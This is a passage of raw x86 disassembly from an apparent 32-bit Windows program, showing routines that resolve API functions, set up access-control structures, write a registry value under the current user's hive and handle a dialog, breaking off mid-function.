  40915e:	call   0x411980
  409163:	mov    esp,ebp
  409165:	pop    ebp
  409166:	ret    
  409167:	int3   
  409168:	int3   
  409169:	int3   
  40916a:	int3   
  40916b:	int3   
  40916c:	mov    edi,edi
  40916e:	push   ebp
  40916f:	mov    ebp,esp
  409171:	push   ecx
  409172:	mov    eax,ds:0x413004
  409177:	xor    eax,ebp
  409179:	mov    DWORD PTR [ebp-0x4],eax
  40917c:	push   esi
  40917d:	push   edi
  40917e:	xor    edi,edi
  409180:	call   DWORD PTR ds:0x4141ac
  409186:	cmp    eax,0x2
  409189:	jne    0x409280
  40918f:	call   DWORD PTR ds:0x4141b4
  409195:	cmp    eax,0x6
  409198:	jb     0x409280
  40919e:	cmp    DWORD PTR ds:0x4136c0,edi
  4091a4:	jne    0x409280
  4091aa:	cmp    DWORD PTR ds:0x4130e4,0x800704c7
  4091b4:	je     0x409283
  4091ba:	mov    eax,ds:0x4130e0
  4091bf:	test   eax,eax
  4091c1:	je     0x4091d1
  4091c3:	push   edi
  4091c4:	call   DWORD PTR ds:0x414218
  4091ca:	mov    ds:0x4130e0,eax
  4091cf:	test   eax,eax
  4091d1:	jns    0x4091ee
  4091d3:	push   eax
  4091d4:	push   0x402ae8
  4091d9:	push   DWORD PTR ds:0x4130e8
  4091df:	call   0x40e818
  4091e4:	add    esp,0xc
  4091e7:	xor    eax,eax
  4091e9:	jmp    0x409285
  4091ee:	sub    esp,0xc
  4091f1:	push   DWORD PTR ds:0x4136bc
  4091f7:	call   DWORD PTR ds:0x41416c
  4091fd:	neg    eax
  4091ff:	sbb    eax,eax
  409201:	and    eax,DWORD PTR ds:0x4136bc
  409207:	mov    ecx,eax
  409209:	call   0x40f129
  40920e:	mov    ds:0x4130e4,eax
  409213:	test   eax,eax
  409215:	js     0x40926a
  409217:	mov    eax,ds:0x4136c4
  40921c:	push   0x4136c0
  409221:	push   0x40356c
  409226:	push   eax
  409227:	mov    ecx,DWORD PTR [eax]
  409229:	mov    esi,DWORD PTR [ecx]
  40922b:	mov    ecx,esi
  40922d:	call   DWORD PTR ds:0x414220
  409233:	call   esi
  409235:	test   eax,eax
  409237:	jns    0x409280
  409239:	push   eax
  40923a:	push   0x402b30
  40923f:	push   DWORD PTR ds:0x4130e8
  409245:	call   0x40e818
  40924a:	mov    eax,ds:0x4136c4
  40924f:	add    esp,0xc
  409252:	mov    ecx,DWORD PTR [eax]
  409254:	push   eax
  409255:	mov    esi,DWORD PTR [ecx+0x8]
  409258:	mov    ecx,esi
  40925a:	call   DWORD PTR ds:0x414220
  409260:	call   esi
  409262:	mov    DWORD PTR ds:0x4136c4,edi
  409268:	jmp    0x409283
  40926a:	push   eax
  40926b:	push   0x402b30
  409270:	push   DWORD PTR ds:0x4130e8
  409276:	call   0x40e818
  40927b:	add    esp,0xc
  40927e:	jmp    0x409283
  409280:	xor    edi,edi
  409282:	inc    edi
  409283:	mov    eax,edi
  409285:	mov    ecx,DWORD PTR [ebp-0x4]
  409288:	pop    edi
  409289:	xor    ecx,ebp
  40928b:	pop    esi
  40928c:	call   0x411980
  409291:	mov    esp,ebp
  409293:	pop    ebp
  409294:	ret    
  409295:	int3   
  409296:	int3   
  409297:	int3   
  409298:	int3   
  409299:	int3   
  40929a:	mov    edi,edi
  40929c:	push   ebp
  40929d:	mov    ebp,esp
  40929f:	push   ecx
  4092a0:	mov    eax,ds:0x413004
  4092a5:	xor    eax,ebp
  4092a7:	mov    DWORD PTR [ebp-0x4],eax
  4092aa:	mov    ecx,DWORD PTR ds:0x4136c0
  4092b0:	push   esi
  4092b1:	test   ecx,ecx
  4092b3:	je     0x4092cc
  4092b5:	mov    eax,DWORD PTR [ecx]
  4092b7:	push   ecx
  4092b8:	mov    esi,DWORD PTR [eax+0x8]
  4092bb:	mov    ecx,esi
  4092bd:	call   DWORD PTR ds:0x414220
  4092c3:	call   esi
  4092c5:	and    DWORD PTR ds:0x4136c0,0x0
  4092cc:	mov    ecx,DWORD PTR ds:0x4136c4
  4092d2:	test   ecx,ecx
  4092d4:	je     0x4092ed
  4092d6:	mov    eax,DWORD PTR [ecx]
  4092d8:	push   ecx
  4092d9:	mov    esi,DWORD PTR [eax+0x8]
  4092dc:	mov    ecx,esi
  4092de:	call   DWORD PTR ds:0x414220
  4092e4:	call   esi
  4092e6:	and    DWORD PTR ds:0x4136c4,0x0
  4092ed:	cmp    DWORD PTR ds:0x4130e0,0x0
  4092f4:	mov    esi,0x80004005
  4092f9:	jne    0x409307
  4092fb:	call   DWORD PTR ds:0x414214
  409301:	mov    DWORD PTR ds:0x4130e0,esi
  409307:	mov    ecx,DWORD PTR [ebp-0x4]
  40930a:	mov    DWORD PTR ds:0x4130e4,esi
  409310:	xor    ecx,ebp
  409312:	pop    esi
  409313:	call   0x411980
  409318:	mov    esp,ebp
  40931a:	pop    ebp
  40931b:	ret    
  40931c:	int3   
  40931d:	int3   
  40931e:	int3   
  40931f:	int3   
  409320:	int3   
  409321:	mov    edi,edi
  409323:	push   ebp
  409324:	mov    ebp,esp
  409326:	push   ecx
  409327:	push   ecx
  409328:	mov    eax,ds:0x413004
  40932d:	xor    eax,ebp
  40932f:	mov    DWORD PTR [ebp-0x4],eax
  409332:	push   ebx
  409333:	push   esi
  409334:	push   edi
  409335:	mov    edi,ecx
  409337:	mov    ebx,edx
  409339:	mov    DWORD PTR [ebp-0x8],ebx
  40933c:	push   0x7f
  40933e:	pop    esi
  40933f:	test   edi,edi
  409341:	je     0x409380
  409343:	mov    ecx,DWORD PTR [ebp+0xc]
  409346:	mov    edx,0x42c
  40934b:	call   0x40f355
  409350:	mov    ebx,eax
  409352:	test   ebx,ebx
  409354:	je     0x4093b4
  409356:	push   DWORD PTR [ebp+0x10]
  409359:	mov    esi,DWORD PTR [edi]
  40935b:	push   ebx
  40935c:	push   DWORD PTR [ebp+0x8]
  40935f:	push   DWORD PTR [ebp-0x8]
  409362:	mov    ecx,DWORD PTR [esi+0xc]
  409365:	push   edi
  409366:	call   DWORD PTR ds:0x414220
  40936c:	call   DWORD PTR [esi+0xc]
  40936f:	mov    esi,eax
  409371:	push   ebx
  409372:	and    esi,0xffff
  409378:	call   DWORD PTR ds:0x4141bc
  40937e:	jmp    0x4093b4
  409380:	xor    ecx,ecx
  409382:	lea    eax,[ebp-0x8]
  409385:	push   eax
  409386:	push   ecx
  409387:	push   ecx
  409388:	push   ecx
  409389:	xor    edx,edx
  40938b:	mov    DWORD PTR [ebp-0x8],ecx
  40938e:	call   0x4086b2
  409393:	test   eax,eax
  409395:	je     0x4093b4
  409397:	mov    edi,DWORD PTR [ebp-0x8]
  40939a:	test   edi,edi
  40939c:	je     0x4093b4
  40939e:	push   DWORD PTR [ebp+0x10]
  4093a1:	mov    ecx,edi
  4093a3:	push   DWORD PTR [ebp+0xc]
  4093a6:	push   DWORD PTR [ebp+0x8]
  4093a9:	push   ebx
  4093aa:	call   DWORD PTR ds:0x414220
  4093b0:	call   edi
  4093b2:	mov    esi,eax
  4093b4:	mov    ecx,DWORD PTR [ebp-0x4]
  4093b7:	mov    eax,esi
  4093b9:	pop    edi
  4093ba:	pop    esi
  4093bb:	xor    ecx,ebp
  4093bd:	pop    ebx
  4093be:	call   0x411980
  4093c3:	mov    esp,ebp
  4093c5:	pop    ebp
  4093c6:	ret    0xc
  4093c9:	int3   
  4093ca:	int3   
  4093cb:	int3   
  4093cc:	int3   
  4093cd:	int3   
  4093ce:	mov    edi,edi
  4093d0:	push   ebp
  4093d1:	mov    ebp,esp
  4093d3:	sub    esp,0x10
  4093d6:	mov    eax,ds:0x413004
  4093db:	xor    eax,ebp
  4093dd:	mov    DWORD PTR [ebp-0x4],eax
  4093e0:	push   ebx
  4093e1:	push   esi
  4093e2:	push   edi
  4093e3:	mov    edi,DWORD PTR [ebp+0xc]
  4093e6:	mov    esi,ecx
  4093e8:	mov    DWORD PTR [ebp-0x10],edx
  4093eb:	mov    ecx,edi
  4093ed:	mov    DWORD PTR [ebp-0x8],esi
  4093f0:	mov    ebx,DWORD PTR [edi]
  4093f2:	mov    edx,ebx
  4093f4:	call   0x40f355
  4093f9:	mov    DWORD PTR [ebp-0xc],eax
  4093fc:	test   eax,eax
  4093fe:	je     0x40944f
  409400:	mov    esi,DWORD PTR [esi]
  409402:	lea    eax,[ebp-0xc]
  409405:	push   ebx
  409406:	push   eax
  409407:	push   DWORD PTR [ebp+0x8]
  40940a:	mov    ecx,DWORD PTR [esi+0x10]
  40940d:	push   DWORD PTR [ebp-0x10]
  409410:	push   DWORD PTR [ebp-0x8]
  409413:	call   DWORD PTR ds:0x414220
  409419:	call   DWORD PTR [esi+0x10]
  40941c:	mov    ecx,DWORD PTR [ebp-0xc]
  40941f:	lea    edx,[ebp-0x8]
  409422:	and    DWORD PTR [ebp-0x8],0x0
  409426:	mov    esi,eax
  409428:	and    esi,0xffff
  40942e:	call   0x40f3c9
  409433:	mov    ebx,eax
  409435:	test   ebx,ebx
  409437:	je     0x40944f
  409439:	mov    ecx,DWORD PTR [ebx]
  40943b:	push   DWORD PTR [ebp-0xc]
  40943e:	mov    DWORD PTR [edi],ecx
  409440:	call   DWORD PTR ds:0x4141bc
  409446:	push   ebx
  409447:	call   DWORD PTR ds:0x4141bc
  40944d:	jmp    0x409452
  40944f:	push   0x8
  409451:	pop    esi
  409452:	mov    ecx,DWORD PTR [ebp-0x4]
  409455:	mov    eax,esi
  409457:	pop    edi
  409458:	pop    esi
  409459:	xor    ecx,ebp
  40945b:	pop    ebx
  40945c:	call   0x411980
  409461:	mov    esp,ebp
  409463:	pop    ebp
  409464:	ret    0x8
  409467:	int3   
  409468:	int3   
  409469:	int3   
  40946a:	int3   
  40946b:	int3   
  40946c:	mov    edi,edi
  40946e:	push   ebp
  40946f:	mov    ebp,esp
  409471:	sub    esp,0xb4
  409477:	mov    eax,ds:0x413004
  40947c:	xor    eax,ebp
  40947e:	mov    DWORD PTR [ebp-0x4],eax
  409481:	push   ebx
  409482:	xor    ebx,ebx
  409484:	mov    WORD PTR [ebp-0x78],0x500
  40948a:	push   esi
  40948b:	push   edi
  40948c:	push   0x5c
  40948e:	lea    eax,[ebp-0x60]
  409491:	mov    DWORD PTR [ebp-0x94],ebx
  409497:	push   ebx
  409498:	push   eax
  409499:	mov    DWORD PTR [ebp-0x8c],ebx
  40949f:	mov    DWORD PTR [ebp-0x90],ebx
  4094a5:	mov    DWORD PTR [ebp-0x98],ebx
  4094ab:	mov    DWORD PTR [ebp-0xa8],ebx
  4094b1:	mov    DWORD PTR [ebp-0x7c],ebx
  4094b4:	mov    DWORD PTR [ebp-0x6c],ebx
  4094b7:	mov    WORD PTR [ebp-0x68],0x100
  4094bd:	mov    DWORD PTR [ebp-0x74],ebx
  4094c0:	mov    WORD PTR [ebp-0x70],0x300
  4094c6:	mov    DWORD PTR [ebp-0x64],ebx
  4094c9:	call   0x412060
  4094ce:	add    esp,0xc
  4094d1:	mov    DWORD PTR [ebp-0x84],ebx
  4094d7:	mov    DWORD PTR [ebp-0xac],ebx
  4094dd:	mov    edi,ebx
  4094df:	mov    DWORD PTR [ebp-0x9c],ebx
  4094e5:	push   0x402c0c
  4094ea:	call   DWORD PTR ds:0x4140a0
  4094f0:	mov    ebx,eax
  4094f2:	test   ebx,ebx
  4094f4:	je     0x409846
  4094fa:	push   0x402c28
  4094ff:	push   ebx
  409500:	call   DWORD PTR ds:0x414048
  409506:	push   0x402c44
  40950b:	push   ebx
  40950c:	mov    esi,eax
  40950e:	call   DWORD PTR ds:0x414048
  409514:	push   0x402c58
  409519:	push   ebx
  40951a:	mov    DWORD PTR [ebp-0xa4],eax
  409520:	call   DWORD PTR ds:0x414048
  409526:	push   0x402c70
  40952b:	push   ebx
  40952c:	mov    DWORD PTR [ebp-0xb0],eax
  409532:	call   DWORD PTR ds:0x414048
  409538:	push   0x402c78
  40953d:	push   ebx
  40953e:	mov    edi,eax
  409540:	call   DWORD PTR ds:0x414048
  409546:	push   0x402c90
  40954b:	push   ebx
  40954c:	mov    DWORD PTR [ebp-0x88],eax
  409552:	call   DWORD PTR ds:0x414048
  409558:	push   0x402ca4
  40955d:	push   ebx
  40955e:	mov    DWORD PTR [ebp-0x80],eax
  409561:	call   DWORD PTR ds:0x414048
  409567:	cmp    DWORD PTR [ebp-0x80],0x0
  40956b:	mov    DWORD PTR [ebp-0xa0],eax
  409571:	je     0x40983f
  409577:	test   eax,eax
  409579:	je     0x40983f
  40957f:	test   esi,esi
  409581:	je     0x40983f
  409587:	cmp    DWORD PTR [ebp-0xa4],0x0
  40958e:	je     0x40983f
  409594:	cmp    DWORD PTR [ebp-0xb0],0x0
  40959b:	je     0x40983f
  4095a1:	test   edi,edi
  4095a3:	je     0x40983f
  4095a9:	cmp    DWORD PTR [ebp-0x88],0x0
  4095b0:	je     0x40983f
  4095b6:	lea    eax,[ebp-0x8c]
  4095bc:	mov    ecx,esi
  4095be:	push   eax
  4095bf:	xor    eax,eax
  4095c1:	push   eax
  4095c2:	push   eax
  4095c3:	push   eax
  4095c4:	push   eax
  4095c5:	push   eax
  4095c6:	push   eax
  4095c7:	push   eax
  4095c8:	push   eax
  4095c9:	push   0x1
  4095cb:	lea    eax,[ebp-0x6c]
  4095ce:	push   eax
  4095cf:	call   DWORD PTR ds:0x414220
  4095d5:	call   esi
  4095d7:	test   eax,eax
  4095d9:	je     0x409828
  4095df:	cmp    DWORD PTR [ebp-0x8c],0x0
  4095e6:	je     0x409828
  4095ec:	lea    eax,[ebp-0x90]
  4095f2:	mov    ecx,esi
  4095f4:	push   eax
  4095f5:	xor    eax,eax
  4095f7:	push   eax
  4095f8:	push   eax
  4095f9:	push   eax
  4095fa:	push   eax
  4095fb:	push   eax
  4095fc:	push   eax
  4095fd:	push   0x220
  409602:	push   0x20
  409604:	push   0x2
  409606:	lea    eax,[ebp-0x7c]
  409609:	push   eax
  40960a:	call   DWORD PTR ds:0x414220
  409610:	call   esi
  409612:	test   eax,eax
  409614:	je     0x409828
  40961a:	cmp    DWORD PTR [ebp-0x90],0x0
  409621:	je     0x409828
  409627:	lea    eax,[ebp-0x98]
  40962d:	mov    ecx,esi
  40962f:	push   eax
  409630:	xor    eax,eax
  409632:	push   eax
  409633:	push   eax
  409634:	push   eax
  409635:	push   eax
  409636:	push   eax
  409637:	push   eax
  409638:	push   eax
  409639:	push   eax
  40963a:	push   0x1
  40963c:	lea    eax,[ebp-0x74]
  40963f:	push   eax
  409640:	call   DWORD PTR ds:0x414220
  409646:	call   esi
  409648:	test   eax,eax
  40964a:	je     0x409828
  409650:	cmp    DWORD PTR [ebp-0x98],0x0
  409657:	je     0x409828
  40965d:	lea    eax,[ebp-0x84]
  409663:	push   eax
  409664:	push   0x20008
  409669:	call   DWORD PTR ds:0x414054
  40966f:	mov    esi,DWORD PTR [ebp-0x80]
  409672:	mov    ecx,esi
  409674:	push   eax
  409675:	call   DWORD PTR ds:0x414220
  40967b:	call   esi
  40967d:	mov    esi,eax
  40967f:	test   esi,esi
  409681:	je     0x409820
  409687:	cmp    DWORD PTR [ebp-0x84],0x0
  40968e:	je     0x409735
  409694:	mov    esi,DWORD PTR [ebp-0xa0]
  40969a:	lea    eax,[ebp-0x9c]
  4096a0:	push   eax
  4096a1:	push   0x0
  4096a3:	push   0x0
  4096a5:	push   0x1
  4096a7:	push   DWORD PTR [ebp-0x84]
  4096ad:	mov    ecx,esi
  4096af:	call   DWORD PTR ds:0x414220
  4096b5:	call   esi
  4096b7:	cmp    DWORD PTR [ebp-0x9c],0x0
  4096be:	mov    esi,eax
  4096c0:	mov    DWORD PTR [ebp-0x80],esi
  4096c3:	je     0x409722
  4096c5:	push   DWORD PTR [ebp-0x9c]
  4096cb:	call   DWORD PTR ds:0x4141b0
  4096d1:	mov    esi,eax
  4096d3:	mov    DWORD PTR [ebp-0xac],esi
  4096d9:	test   esi,esi
  4096db:	je     0x40971b
  4096dd:	mov    ecx,DWORD PTR [ebp-0xa0]
  4096e3:	lea    eax,[ebp-0xb4]
  4096e9:	and    DWORD PTR [ebp-0xb4],0x0
  4096f0:	push   eax
  4096f1:	push   DWORD PTR [ebp-0x9c]
  4096f7:	push   esi
  4096f8:	push   0x1
  4096fa:	push   DWORD PTR [ebp-0x84]
  409700:	call   DWORD PTR ds:0x414220
  409706:	call   DWORD PTR [ebp-0xa0]
  40970c:	mov    DWORD PTR [ebp-0x80],eax
  40970f:	test   eax,eax
  409711:	je     0x409720
  409713:	mov    eax,DWORD PTR [esi]
  409715:	mov    DWORD PTR [ebp-0xa8],eax
  40971b:	mov    esi,DWORD PTR [ebp-0x80]
  40971e:	jmp    0x409722
  409720:	mov    esi,eax
  409722:	push   DWORD PTR [ebp-0x84]
  409728:	call   DWORD PTR ds:0x414084
  40972e:	and    DWORD PTR [ebp-0x84],0x0
  409735:	test   esi,esi
  409737:	je     0x409820
  40973d:	mov    esi,DWORD PTR [ebp-0xa8]
  409743:	test   esi,esi
  409745:	je     0x409820
  40974b:	push   DWORD PTR [ebp-0x8c]
  409751:	mov    ecx,DWORD PTR [ebp-0x88]
  409757:	lea    eax,[ebp-0x58]
  40975a:	push   eax
  40975b:	call   DWORD PTR ds:0x414220
  409761:	call   DWORD PTR [ebp-0x88]
  409767:	push   DWORD PTR [ebp-0x90]
  40976d:	mov    ecx,DWORD PTR [ebp-0x88]
  409773:	lea    eax,[ebp-0x38]
  409776:	and    DWORD PTR [ebp-0x5c],0x0
  40977a:	push   eax
  40977b:	mov    DWORD PTR [ebp-0x60],0x1
  409782:	mov    DWORD PTR [ebp-0x64],0x80000000
  409789:	call   DWORD PTR ds:0x414220
  40978f:	call   DWORD PTR [ebp-0x88]
  409795:	and    DWORD PTR [ebp-0x3c],0x0
  409799:	lea    eax,[ebp-0x18]
  40979c:	push   esi
  40979d:	mov    esi,DWORD PTR [ebp-0x88]
  4097a3:	mov    ecx,esi
  4097a5:	push   eax
  4097a6:	mov    DWORD PTR [ebp-0x40],0x1
  4097ad:	mov    DWORD PTR [ebp-0x44],0x1fffff
  4097b4:	call   DWORD PTR ds:0x414220
  4097ba:	call   esi
  4097bc:	mov    esi,DWORD PTR [ebp-0xa4]
  4097c2:	lea    eax,[ebp-0x94]
  4097c8:	and    DWORD PTR [ebp-0x1c],0x0
  4097cc:	mov    ecx,esi
  4097ce:	push   eax
  4097cf:	push   0x0
  4097d1:	lea    eax,[ebp-0x64]
  4097d4:	mov    DWORD PTR [ebp-0x20],0x1
  4097db:	push   eax
  4097dc:	push   0x3
  4097de:	mov    DWORD PTR [ebp-0x24],0x1fffff
  4097e5:	call   DWORD PTR ds:0x414220
  4097eb:	call   esi
  4097ed:	mov    esi,eax
  4097ef:	test   esi,esi
  4097f1:	jne    0x40981c
  4097f3:	mov    esi,DWORD PTR [ebp-0xb0]
  4097f9:	mov    ecx,esi
  4097fb:	push   eax
  4097fc:	push   DWORD PTR [ebp-0x94]
  409802:	push   eax
  409803:	push   eax
  409804:	push   0x80000004
  409809:	push   0x4
  40980b:	push   0x402b80
  409810:	call   DWORD PTR ds:0x414220
  409816:	call   esi
  409818:	mov    esi,eax
  40981a:	test   esi,esi
  40981c:	jle    0x40985b
  40981e:	jmp    0x409852
  409820:	call   DWORD PTR ds:0x414074
  409826:	jmp    0x409818
  409828:	call   DWORD PTR ds:0x414074
  40982e:	mov    esi,eax
  409830:	test   esi,esi
  409832:	jle    0x40986c
  409834:	movzx  esi,si
  409837:	or     esi,0x80070000
  40983d:	jmp    0x40986c
  40983f:	mov    esi,0x8007007f
  409844:	jmp    0x40986c
  409846:	call   DWORD PTR ds:0x414074
  40984c:	mov    esi,eax
  40984e:	test   esi,esi
  409850:	jle    0x40986c
  409852:	movzx  esi,si
  409855:	or     esi,0x80070000
  40985b:	mov    eax,DWORD PTR [ebp-0xac]
  409861:	test   eax,eax
  409863:	je     0x40986c
  409865:	push   eax
  409866:	call   DWORD PTR ds:0x4141bc
  40986c:	cmp    DWORD PTR [ebp-0x8c],0x0
  409873:	je     0x409889
  409875:	test   edi,edi
  409877:	je     0x409889
  409879:	push   DWORD PTR [ebp-0x8c]
  40987f:	mov    ecx,edi
  409881:	call   DWORD PTR ds:0x414220
  409887:	call   edi
  409889:	cmp    DWORD PTR [ebp-0x90],0x0
  409890:	je     0x4098a6
  409892:	test   edi,edi
  409894:	je     0x4098a6
  409896:	push   DWORD PTR [ebp-0x90]
  40989c:	mov    ecx,edi
  40989e:	call   DWORD PTR ds:0x414220
  4098a4:	call   edi
  4098a6:	cmp    DWORD PTR [ebp-0x98],0x0
  4098ad:	je     0x4098c3
  4098af:	test   edi,edi
  4098b1:	je     0x4098c3
  4098b3:	push   DWORD PTR [ebp-0x98]
  4098b9:	mov    ecx,edi
  4098bb:	call   DWORD PTR ds:0x414220
  4098c1:	call   edi
  4098c3:	cmp    DWORD PTR [ebp-0x94],0x0
  4098ca:	je     0x4098d8
  4098cc:	push   DWORD PTR [ebp-0x94]
  4098d2:	call   DWORD PTR ds:0x4140b0
  4098d8:	test   ebx,ebx
  4098da:	je     0x4098e3
  4098dc:	push   ebx
  4098dd:	call   DWORD PTR ds:0x414120
  4098e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4098e6:	mov    eax,esi
  4098e8:	pop    edi
  4098e9:	pop    esi
  4098ea:	xor    ecx,ebp
  4098ec:	pop    ebx
  4098ed:	call   0x411980
  4098f2:	mov    esp,ebp
  4098f4:	pop    ebp
  4098f5:	ret    
  4098f6:	int3   
  4098f7:	int3   
  4098f8:	int3   
  4098f9:	int3   
  4098fa:	int3   
  4098fb:	mov    edi,edi
  4098fd:	push   ebp
  4098fe:	mov    ebp,esp
  409900:	sub    esp,0x648
  409906:	mov    eax,ds:0x413004
  40990b:	xor    eax,ebp
  40990d:	mov    DWORD PTR [ebp-0x4],eax
  409910:	push   ebx
  409911:	push   esi
  409912:	push   edi
  409913:	push   0x402cb8
  409918:	mov    esi,ecx
  40991a:	lea    eax,[ebp-0x210]
  409920:	push   esi
  409921:	mov    ebx,0x401f98
  409926:	xor    edi,edi
  409928:	push   ebx
  409929:	push   0x900
  40992e:	push   edi
  40992f:	push   edi
  409930:	push   0x105
  409935:	push   eax
  409936:	call   0x410f98
  40993b:	add    esp,0x20
  40993e:	test   eax,eax
  409940:	js     0x4099b4
  409942:	lea    eax,[ebp-0x210]
  409948:	push   eax
  409949:	lea    ecx,[ebp-0x42c]
  40994f:	call   0x4104d1
  409954:	mov    eax,0x40046
  409959:	cmp    DWORD PTR [ebp-0x220],eax
  40995f:	jb     0x4099b4
  409961:	jne    0x40996f
  409963:	cmp    DWORD PTR [ebp-0x21c],0x515
  40996d:	jb     0x4099b4
  40996f:	push   0x402cd4
  409974:	push   esi
  409975:	push   ebx
  409976:	push   0x900
  40997b:	push   edi
  40997c:	push   edi
  40997d:	lea    eax,[ebp-0x210]
  409983:	push   0x105
  409988:	push   eax
  409989:	call   0x410f98
  40998e:	add    esp,0x20
  409991:	test   eax,eax
  409993:	js     0x4099b4
  409995:	lea    eax,[ebp-0x210]
  40999b:	push   eax
  40999c:	lea    ecx,[ebp-0x648]
  4099a2:	call   0x4104d1
  4099a7:	cmp    DWORD PTR [ebp-0x430],edi
  4099ad:	je     0x4099b4
  4099af:	xor    eax,eax
  4099b1:	inc    eax
  4099b2:	jmp    0x4099b6
  4099b4:	xor    eax,eax
  4099b6:	mov    ecx,DWORD PTR [ebp-0x4]
  4099b9:	pop    edi
  4099ba:	pop    esi
  4099bb:	xor    ecx,ebp
  4099bd:	pop    ebx
  4099be:	call   0x411980
  4099c3:	mov    esp,ebp
  4099c5:	pop    ebp
  4099c6:	ret    
  4099c7:	int3   
  4099c8:	int3   
  4099c9:	int3   
  4099ca:	int3   
  4099cb:	int3   
  4099cc:	mov    edi,edi
  4099ce:	push   ebp
  4099cf:	mov    ebp,esp
  4099d1:	sub    esp,0x630
  4099d7:	mov    eax,ds:0x413004
  4099dc:	xor    eax,ebp
  4099de:	mov    DWORD PTR [ebp-0x4],eax
  4099e1:	push   ebx
  4099e2:	push   esi
  4099e3:	push   edi
  4099e4:	mov    edi,DWORD PTR [ebp+0x8]
  4099e7:	lea    eax,[ebp-0x210]
  4099ed:	push   edx
  4099ee:	push   ecx
  4099ef:	push   0x402cec
  4099f4:	push   0x900
  4099f9:	xor    esi,esi
  4099fb:	mov    ebx,0x105
  409a00:	push   esi
  409a01:	push   esi
  409a02:	push   ebx
  409a03:	push   eax
  409a04:	mov    DWORD PTR [ebp-0x62c],esi
  409a0a:	call   0x410f98
  409a0f:	add    esp,0x20
  409a12:	lea    eax,[ebp-0x628]
  409a18:	push   0x104
  409a1d:	push   eax
  409a1e:	push   0x402d00
  409a23:	call   DWORD PTR ds:0x4140b4
  409a29:	test   eax,eax
  409a2b:	je     0x409b34
  409a31:	cmp    eax,0x104
  409a36:	ja     0x409b34
  409a3c:	sub    esp,0xc
  409a3f:	lea    eax,[ebp-0x628]
  409a45:	push   eax
  409a46:	call   DWORD PTR ds:0x414068
  409a4c:	push   eax
  409a4d:	lea    eax,[ebp-0x210]
  409a53:	mov    edx,ebx
  409a55:	push   eax
  409a56:	lea    ecx,[ebp-0x41c]
  409a5c:	call   0x410ef7
  409a61:	lea    eax,[ebp-0x628]
  409a67:	push   eax
  409a68:	lea    eax,[ebp-0x41c]
  409a6e:	push   eax
  409a6f:	call   DWORD PTR ds:0x41407c
  409a75:	test   eax,eax
  409a77:	jne    0x409b34
  409a7d:	push   0x900
  409a82:	push   ecx
  409a83:	push   ecx
  409a84:	lea    eax,[ebp-0x628]
  409a8a:	push   eax
  409a8b:	call   DWORD PTR ds:0x414068
  409a91:	lea    ecx,[ebp-0x210]
  409a97:	mov    edx,ebx
  409a99:	lea    eax,[ecx+eax*2]
  409a9c:	push   eax
  409a9d:	lea    ecx,[ebp-0x41c]
  409aa3:	call   0x410ebe
  409aa8:	push   0x900
  409aad:	push   ecx
  409aae:	push   ecx
  409aaf:	push   0x402d00
  409ab4:	mov    edx,ebx
  409ab6:	lea    ecx,[ebp-0x210]
  409abc:	call   0x410ebe
  409ac1:	sub    esp,0xc
  409ac4:	lea    eax,[ebp-0x41c]
  409aca:	mov    edx,ebx
  409acc:	lea    ecx,[ebp-0x210]
  409ad2:	push   eax
  409ad3:	call   0x410f31
  409ad8:	lea    eax,[ebp-0x630]
  409ade:	push   eax
  409adf:	lea    eax,[ebp-0x62c]
  409ae5:	push   eax
  409ae6:	push   esi
  409ae7:	push   0x2001f
  409aec:	push   esi
  409aed:	push   esi
  409aee:	push   esi
  409aef:	push   0x401588
  409af4:	push   0x80000001
  409af9:	call   DWORD PTR ds:0x414020
  409aff:	test   eax,eax
  409b01:	jne    0x409b34
  409b03:	lea    eax,[ebp-0x210]
  409b09:	push   eax
  409b0a:	call   DWORD PTR ds:0x414068
  409b10:	lea    eax,[eax*2+0x2]
  409b17:	push   eax
  409b18:	lea    eax,[ebp-0x210]
  409b1e:	push   eax
  409b1f:	push   0x1
  409b21:	push   esi
  409b22:	push   edi
  409b23:	push   DWORD PTR [ebp-0x62c]
  409b29:	call   DWORD PTR ds:0x41403c
  409b2f:	test   eax,eax
  409b31:	jne    0x409b34
  409b33:	inc    esi
  409b34:	cmp    DWORD PTR [ebp-0x62c],0x0
  409b3b:	je     0x409b49
  409b3d:	push   DWORD PTR [ebp-0x62c]
  409b43:	call   DWORD PTR ds:0x414008
  409b49:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4c:	mov    eax,esi
  409b4e:	pop    edi
  409b4f:	pop    esi
  409b50:	xor    ecx,ebp
  409b52:	pop    ebx
  409b53:	call   0x411980
  409b58:	mov    esp,ebp
  409b5a:	pop    ebp
  409b5b:	ret    0x4
  409b5e:	int3   
  409b5f:	int3   
  409b60:	int3   
  409b61:	int3   
  409b62:	int3   
  409b63:	int3   
  409b64:	int3   
  409b65:	int3   
  409b66:	int3   
  409b67:	int3   
  409b68:	int3   
  409b69:	int3   
  409b6a:	int3   
  409b6b:	int3   
  409b6c:	int3   
  409b6d:	int3   
  409b6e:	int3   
  409b6f:	int3   
  409b70:	mov    edi,edi
  409b72:	push   ebp
  409b73:	mov    ebp,esp
  409b75:	mov    eax,DWORD PTR [ebp+0xc]
  409b78:	sub    esp,0x10
  409b7b:	dec    eax
  409b7c:	push   ebx
  409b7d:	push   esi
  409b7e:	push   edi
  409b7f:	sub    eax,0x1
  409b82:	je     0x409e1f
  409b88:	sub    eax,0xe
  409b8b:	je     0x409c70
  409b91:	sub    eax,0x100
  409b96:	je     0x409cff
  409b9c:	sub    eax,0x1
  409b9f:	jne    0x409e4b
  409ba5:	mov    ecx,DWORD PTR [ebp+0x10]
  409ba8:	mov    eax,ecx
  409baa:	shr    eax,0x10
  409bad:	test   ax,ax
  409bb0:	jne    0x409e4b
  409bb6:	movzx  eax,cx
  409bb9:	sub    eax,0x1
  409bbc:	je     0x409c77
  409bc2:	sub    eax,0x1
  409bc5:	je     0x409c70
  409bcb:	sub    eax,0x63
  409bce:	je     0x409c04
  409bd0:	sub    eax,0x1
  409bd3:	jne    0x409e4b
  409bd9:	push   0x66
  409bdb:	pop    esi
  409bdc:	push   esi
  409bdd:	push   esi
  409bde:	push   0x65
  409be0:	push   DWORD PTR [ebp+0x8]
  409be3:	call   DWORD PTR ds:0x414170
  409be9:	push   esi
  409bea:	push   DWORD PTR [ebp+0x8]
  409bed:	call   DWORD PTR ds:0x41415c
  409bf3:	push   eax
  409bf4:	call   DWORD PTR ds:0x41418c
  409bfa:	call   0x40929a
  409bff:	jmp    0x409e4b
  409c04:	cmp    BYTE PTR ds:0x4136b8,0x0
  409c0b:	jne    0x409e4b
  409c11:	mov    ebx,DWORD PTR [ebp+0x8]
  409c14:	push   0x66
